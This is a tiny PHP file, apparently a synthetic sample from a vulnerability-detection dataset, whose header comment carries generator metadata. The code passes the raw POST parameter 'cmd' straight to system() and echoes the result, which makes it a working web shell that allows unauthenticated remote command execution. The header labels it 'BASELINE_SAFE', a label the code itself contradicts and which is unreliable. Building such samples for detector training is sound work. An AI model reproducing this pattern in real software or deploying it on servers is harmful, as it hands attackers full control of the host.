<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=POST_AKE; SKELETON=S3; KEY=cmd; SINK=B1; VAR=v0047 */
function SINK_B1($command){
    system($command);
}
$inp = array_key_exists("cmd", $_POST) ? (string)$_POST["cmd"] : "";
$inp = (string)$inp; // no value processing
$f = function($x){
    return SINK_B1($x);
};
$out = $f($inp);
echo (string)($out);
?>
